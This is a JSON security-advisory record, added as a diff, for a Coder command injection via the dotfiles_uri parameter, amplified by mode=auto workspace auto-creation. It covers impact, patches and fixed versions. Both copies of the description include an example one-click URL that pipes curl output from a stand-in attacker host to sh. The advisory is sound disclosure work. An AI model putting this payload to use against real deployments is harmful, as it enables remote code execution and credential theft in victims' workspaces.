@@ -1,0 +1,120 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-44454",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "# Command injection via dotfiles URI parameter combined with workspace auto-creation\n\n## Summary\n\nThe `dotfiles` registry module passed unsanitized user input to shell commands, allowing arbitrary code execution inside a provisioned workspace. Any user who supplied a crafted `dotfiles_uri` value (for example, one containing shell command substitution such as `$(...)`) could achieve command execution in their own workspace. The Create Workspace page's `mode=auto` deep links amplified this into a one-click attack: an attacker could craft a URL that prefilled `param.dotfiles_uri` and silently provisioned a workspace with the attacker-controlled value, with no explicit user confirmation.\n\n## Details\n\n### Command injection in the dotfiles module (root cause)\n\nThe [dotfiles module](https://github.com/coder/registry/tree/main/registry/coder/modules/dotfiles) interpolated the user-provided `dotfiles_uri` value directly into a shell script and executed it without input validation. Because the value was expanded by the shell, payloads using command substitution (`$(...)`), command separators (`;`, `|`, `&&`), or backticks were interpreted before the `coder dotfiles` CLI was invoked. The Coder CLI itself uses `exec.CommandContext()` with an argument array and is not vulnerable; the injection occurred earlier, during shell expansion inside the module. As a result, a user who entered a crafted `dotfiles_uri` obtained arbitrary code execution in their workspace, even without `mode=auto`.\n\n### Auto-creation amplification (`mode=auto`)\n\nThe Create Workspace page supported a `mode=auto` query parameter that, combined with `param.*` URL parameters, automatically created a workspace on page load without displaying a confirmation prompt. An attacker could craft a malicious URL pointing to a victim's Coder deployment and set arbitrary template parameter values (for example, `param.dotfiles_uri`). When an authenticated user clicked the link, the workspace was created immediately with the attacker-supplied parameters, turning the command injection above into a one-click, no-consent attack.\n\nExample URL:\n\n```\nhttps://<deployment>/templates/<template>/workspace?mode=auto&param.dotfiles_uri=foo$(curl https://attacker.example/x | sh).com\n```\n\n## Impact\n\nArbitrary code execution inside the victim's workspace. Depending on the workspace's privileges, this may expose Git credentials, secrets, and workspace files, and can provide a foothold for lateral movement. With `mode=auto`, exploitation required only that an authenticated user click an attacker-supplied link to a template that uses the dotfiles module.\n\n## Patches\n\n### coder/registry (primary fix)\n\nInput validation was added to the dotfiles module to reject URIs and usernames containing special characters, and the unsafe `eval`/`sh -c` usage was removed. This eliminates the command injection at its source.\n\n- https://github.com/coder/registry/pull/703\n\n### coder/coder (defense-in-depth)\n\nA consent dialog was added that displays all prefilled `param.*` values and blocks creation until the user explicitly clicks **Confirm and Create**. This removes the `mode=auto` one-click amplification vector.\n\n- Fix commit: https://github.com/coder/coder/commit/60e3ab7632f42415d283b9fd5622ee53a4639ceb (PR [#22011](https://github.com/coder/coder/pull/22011))\n- Patched releases:\n  - [v2.29.7](https://github.com/coder/coder/releases/tag/v2.29.7) (ESR)\n  - [v2.30.2](https://github.com/coder/coder/releases/tag/v2.30.2) (mainline)\n\n### Recognition\nWe'd like to thank [Aviv Donenfeld](https://github.com/avivdon) for responsibly disclosing this issue in accordance with https://coder.com/security/policy",
+    "ghsa_id": "GHSA-m3cr-vc2j-pm27",
+    "html_url": "https://github.com/advisories/GHSA-m3cr-vc2j-pm27",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-m3cr-vc2j-pm27"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-44454"
+      }
+    ],
+    "published_at": "2026-07-02T18:14:44Z",
+    "references": [
+      "https://github.com/coder/coder/security/advisories/GHSA-m3cr-vc2j-pm27",
+      "https://github.com/coder/coder/pull/22011",
+      "https://github.com/coder/registry/pull/703",
+      "https://github.com/coder/coder/commit/60e3ab7632f42415d283b9fd5622ee53a4639ceb",
+      "https://github.com/coder/registry/commit/8e68c96633f65a1babd76a93b6923e3deead4a82",
+      "https://github.com/coder/coder/releases/tag/v2.29.7",
+      "https://github.com/coder/coder/releases/tag/v2.30.2",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-44454",
+      "https://github.com/advisories/GHSA-m3cr-vc2j-pm27"
+    ],
+    "severity": "high",
+    "summary": "Coder vulnerable to workspace auto-creation via crafted URL parameters without user consent",
+    "updated_at": "2026-07-07T22:17:27Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "2.29.7",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": "< 2.29.7"
+      },
+      {
+        "first_patched_version": "2.30.2",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "vulnerable_version_range": ">= 2.30.0, < 2.30.2"
+      },
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder"
+        },
+        "vulnerable_version_range": "<= 0.27.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-m3cr-vc2j-pm27",
+  "repo": {
+    "cve_id": "CVE-2026-44454",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "# Command injection via dotfiles URI parameter combined with workspace auto-creation\r\n\r\n## Summary\r\n\r\nThe `dotfiles` registry module passed unsanitized user input to shell commands, allowing arbitrary code execution inside a provisioned workspace. Any user who supplied a crafted `dotfiles_uri` value (for example, one containing shell command substitution such as `$(...)`) could achieve command execution in their own workspace. The Create Workspace page's `mode=auto` deep links amplified this into a one-click attack: an attacker could craft a URL that prefilled `param.dotfiles_uri` and silently provisioned a workspace with the attacker-controlled value, with no explicit user confirmation.\r\n\r\n## Details\r\n\r\n### Command injection in the dotfiles module (root cause)\r\n\r\nThe [dotfiles module](https://github.com/coder/registry/tree/main/registry/coder/modules/dotfiles) interpolated the user-provided `dotfiles_uri` value directly into a shell script and executed it without input validation. Because the value was expanded by the shell, payloads using command substitution (`$(...)`), command separators (`;`, `|`, `&&`), or backticks were interpreted before the `coder dotfiles` CLI was invoked. The Coder CLI itself uses `exec.CommandContext()` with an argument array and is not vulnerable; the injection occurred earlier, during shell expansion inside the module. As a result, a user who entered a crafted `dotfiles_uri` obtained arbitrary code execution in their workspace, even without `mode=auto`.\r\n\r\n### Auto-creation amplification (`mode=auto`)\r\n\r\nThe Create Workspace page supported a `mode=auto` query parameter that, combined with `param.*` URL parameters, automatically created a workspace on page load without displaying a confirmation prompt. An attacker could craft a malicious URL pointing to a victim's Coder deployment and set arbitrary template parameter values (for example, `param.dotfiles_uri`). When an authenticated user clicked the link, the workspace was created immediately with the attacker-supplied parameters, turning the command injection above into a one-click, no-consent attack.\r\n\r\nExample URL:\r\n\r\n```\r\nhttps://<deployment>/templates/<template>/workspace?mode=auto&param.dotfiles_uri=foo$(curl https://attacker.example/x | sh).com\r\n```\r\n\r\n## Impact\r\n\r\nArbitrary code execution inside the victim's workspace. Depending on the workspace's privileges, this may expose Git credentials, secrets, and workspace files, and can provide a foothold for lateral movement. With `mode=auto`, exploitation required only that an authenticated user click an attacker-supplied link to a template that uses the dotfiles module.\r\n\r\n## Patches\r\n\r\n### coder/registry (primary fix)\r\n\r\nInput validation was added to the dotfiles module to reject URIs and usernames containing special characters, and the unsafe `eval`/`sh -c` usage was removed. This eliminates the command injection at its source.\r\n\r\n- https://github.com/coder/registry/pull/703\r\n\r\n### coder/coder (defense-in-depth)\r\n\r\nA consent dialog was added that displays all prefilled `param.*` values and blocks creation until the user explicitly clicks **Confirm and Create**. This removes the `mode=auto` one-click amplification vector.\r\n\r\n- Fix commit: https://github.com/coder/coder/commit/60e3ab7632f42415d283b9fd5622ee53a4639ceb (PR [#22011](https://github.com/coder/coder/pull/22011))\r\n- Patched releases:\r\n  - [v2.29.7](https://github.com/coder/coder/releases/tag/v2.29.7) (ESR)\r\n  - [v2.30.2](https://github.com/coder/coder/releases/tag/v2.30.2) (mainline)\r\n\r\n### Recognition\r\nWe'd like to thank [Aviv Donenfeld](https://github.com/avivdon) for responsibly disclosing this issue in accordance with https://coder.com/security/policy\r\n",
+    "ghsa_id": "GHSA-m3cr-vc2j-pm27",
+    "html_url": "https://github.com/coder/coder/security/advisories/GHSA-m3cr-vc2j-pm27",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-m3cr-vc2j-pm27"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-44454"
+      }
+    ],
+    "published_at": "2026-07-02T15:38:37Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command injection via dotfiles URI parameter combined with workspace auto-creation",
+    "updated_at": "2026-07-02T15:38:37Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/coder/coder/v2"
+        },
+        "patched_versions": "2.29.7, 2.30.2",
+        "vulnerable_version_range": "< 2.29.7, < 2.30.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coder/coder"
+}
